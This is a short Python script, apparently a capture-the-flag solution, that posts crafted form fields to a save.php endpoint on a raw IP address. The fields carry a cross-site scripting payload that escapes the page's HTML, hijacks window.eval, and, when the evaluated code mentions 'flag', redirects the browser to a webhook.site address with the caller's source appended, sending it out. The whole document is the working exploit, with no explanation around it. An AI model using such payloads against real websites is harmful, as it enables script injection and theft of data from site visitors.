import requests

data = {
    'color': 'blue',
    'name': '");<!--<script\n`',
    'desc': '`;const originalEval = eval; function fake_eval(code){if (code.includes("flag")) { location.href = "https://webhook.site/9d8a5d3d-2d2b-481e-8aa1-4fda098a305f".concat(escape(fake_eval.caller)); } return true; }; window.eval = fake_eval;//</script>--><a href="x">',
}

res = requests.post('http://43.202.156.238:27221/save.php', data=data)
print(res.text)
